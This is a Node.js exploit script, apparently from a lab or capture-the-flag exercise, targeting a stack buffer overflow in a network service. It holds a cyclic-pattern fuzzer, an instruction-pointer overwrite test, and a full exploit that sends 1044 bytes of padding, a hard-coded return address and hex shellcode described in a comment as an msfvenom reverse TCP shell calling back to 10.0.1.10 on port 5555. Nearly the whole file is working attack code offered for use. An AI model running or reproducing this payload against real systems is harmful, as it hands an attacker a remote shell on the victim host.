const { pbkdf2 } = require("crypto");
const net = require("net");

function fuzzer(ip, port) {
  console.log("running fuzzer");
  const client = net.connect(
    {
      host: ip,
      port: port,
    },
    function (res) {
      console.log("connected");
      //const message = 'Hello World!';
      const message =
        "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngA";

      //first send the header
      const buf = Buffer(4);
      buf.writeUInt32LE(message.length, 0);
      client.write(buf);

      //then send the message
      const raw = Buffer.from(message);
      client.write(raw);
    },
  );
}

function overwriteEIP(ip, port) {
  console.log("running overwriteEIP");
  const client = net.connect(
    {
      host: ip,
      port: port,
    },
    function (res) {
      console.log("connected");
      //first send the overflowed buffer
      const message = "A".repeat(1044);
      const buf = Buffer.from(message);

      // send the stack pointer value
      const ret = Buffer(4);
      ret.writeUInt32LE(0xdeadbeef, 0);

      //then send the payload
      const shellcode = "Z".repeat(74);
      const payload = Buffer.from(shellcode);

      const packet = Buffer.concat([buf, ret, payload]);
      client.write(packet);
    },
  );
}

function exploit(ip, port) {
  console.log("running expoit");
  const client = net.connect(
    {
      host: ip,
      port: port,
    },
    function (res) {
      console.log("connected");

      //first send the overflowed buffer
      const message = "A".repeat(1044);
      const buf = Buffer.from(message);

      // send the stack pointer value
      const ret = Buffer.alloc(4);
      ret.writeUInt32LE(0xffffce10, 0);

      //then send the payload
      // msfvenom LHOST=10.0.1.10 LPORT=5555 -f hex -p linux/x64/shell_reverse_tcp
      const shellcode =
        "31dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a00010a68020015b389e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80";
      const payload = Buffer.from(shellcode, "hex");

      const packet = Buffer.concat([buf, ret, payload]);
      client.write(packet);
    },
  );
}

const args = process.argv.slice(2);
if (args.length != 2) {
  console.log("usage: node index.js <command> <ip:port>");
  return;
}

const [ip, port] = args[1].split(":");

switch (args[0]) {
  case "fuzzer":
    fuzzer(ip, port);
    break;
  case "eip":
    overwriteEIP(ip, port);
    break;
  default:
    exploit(ip, port);
    break;
}
